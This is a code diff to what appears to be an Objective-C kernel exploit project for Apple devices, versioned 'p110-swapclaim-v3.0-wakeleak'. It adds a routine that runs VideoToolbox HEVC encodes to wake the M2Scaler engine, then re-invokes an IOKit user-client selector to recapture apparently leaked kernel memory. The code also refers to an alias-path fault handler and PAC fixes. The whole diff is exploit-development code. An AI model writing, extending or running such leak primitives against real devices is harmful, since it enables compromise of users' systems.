@@ -97,10 +97,17 @@
 #import <stdatomic.h>
 #import <mach/mach.h>
 #import <mach/thread_policy.h>
+
+/* v3.0 wake-then-leak (the p145-class VT battery imports) */
+#import <VideoToolbox/VideoToolbox.h>
+#import <CoreVideo/CoreVideo.h>
+#import <CoreMedia/CoreMedia.h>
+
+static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMSampleBufferRef sb);
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v2.9-pacfix"
+#define P110_BUILD      @"p110-swapclaim-v3.0-wakeleak"
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
 #define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
@@ -295,6 +302,8 @@ static void p110_pin(void) {
 }
 
 /* ---- (b) in-process Family-B catch: async-signal-safe honest verdict --- */
+static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMSampleBufferRef sb) { (void)r; (void)e; (void)st; (void)f; (void)sb; }
+
 static void p110_sigfault(int sig, siginfo_t *si, void *ctx) {
     /* A kernel-side autda death never reaches us (device reboots); this
        catches the SIGBUS/EFAULT-class alias-path fault in OUR process =
@@ -586,6 +595,57 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                                     g_p110_leak_out, &outLen);
     g_p110_leak_caps++;
 
+    /* ---- v3.0 WAKE-THEN-LEAK (the 11-06 device rows: 2bf engine-asleep ----
+       every capture) — the p145/p147 law: VT HEVC encodes open the M2Scaler
+       engine IN THIS PROCESS. Wake via a bounded battery, then ONE recapture.
+       No state-machine hacks; the framework route stays the lawful path. ---- */
+    if (sku8 == LabSkuT8150_24A435 && tag && [tag isEqualToString:@"validate"] &&
+        kr == 0xe00002bf) {
+        static BOOL g_p110_wakeTried = NO;
+        if (!g_p110_wakeTried) {
+            g_p110_wakeTried = YES;
+            L(@"[leak] ENGINE WAKE: the p145-class VT HEVC battery (3 cycles,"
+              @" 1280x720, the stage9 pack) ON THE TAP THREAD — the scaler"
+              @" engine opens in-process, then ONE recapture of sel-8.");
+            int woke = 0;
+            for (int wc = 0; wc < 3 && woke == 0; wc++) {
+                VTCompressionSessionRef ws = NULL;
+                OSStatus wst = VTCompressionSessionCreate(
+                    kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
+                    NULL, NULL, NULL, p110_flushCB, NULL, &ws);
+                if (wst != noErr || !ws) break;
+                VTSessionSetProperty(ws, (__bridge CFStringRef)@"EncoderUsage",
+                                     (__bridge CFTypeRef)[NSNumber numberWithInt:1]);
+                VTSessionSetProperty(ws, (__bridge CFStringRef)@"RCMode",
+                                     (__bridge CFTypeRef)[NSNumber numberWithInt:20]);
+                VTSessionSetProperty(ws, kVTCompressionPropertyKey_RealTime,
+                                     kCFBooleanFalse);
+                if (VTCompressionSessionPrepareToEncodeFrames(ws) == noErr) {
+                    CVPixelBufferRef wpb = NULL;
+                    if (CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
+                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+                            NULL, &wpb) == noErr && wpb) {
+                        VTEncodeInfoFlags wflags = 0;
+                        OSStatus est = VTCompressionSessionEncodeFrame(ws, wpb,
+                            CMTimeMake((int64_t)wc, 30), kCMTimeInvalid, NULL,
+                            NULL, &wflags);
+                        VTCompressionSessionCompleteFrames(ws, kCMTimeInvalid);
+                        CVPixelBufferRelease(wpb);
+                        if (est == noErr) woke = 1;
+                    }
+                }
+                VTCompressionSessionInvalidate(ws);
+                CFRelease(ws);
+            }
+            Lf(@"[leak] wake battery: %s — recapture sel-8 now", woke ? "FIRED (encode st=0)" : "no clean encode (honest)");
+            in64 = (uint64_t)(uintptr_t)g_p110_leak_out;
+            memset(g_p110_leak_out, 0, sizeof(g_p110_leak_out));
+            outLen = sizeof(g_p110_leak_out);
+            kr = g_p110_callStruct(g_p110_m2conn, 8, &in64, sizeof(in64),
+                                   g_p110_leak_out, &outLen);
+            g_p110_leak_caps++;
+        }
+    }
     /* ---- the T8150 readback law (decode-confirmed): classify OUR ----
        buffer, never the untouched structureOutput ---- */
     if (sku8 == LabSkuT8150_24A435) {
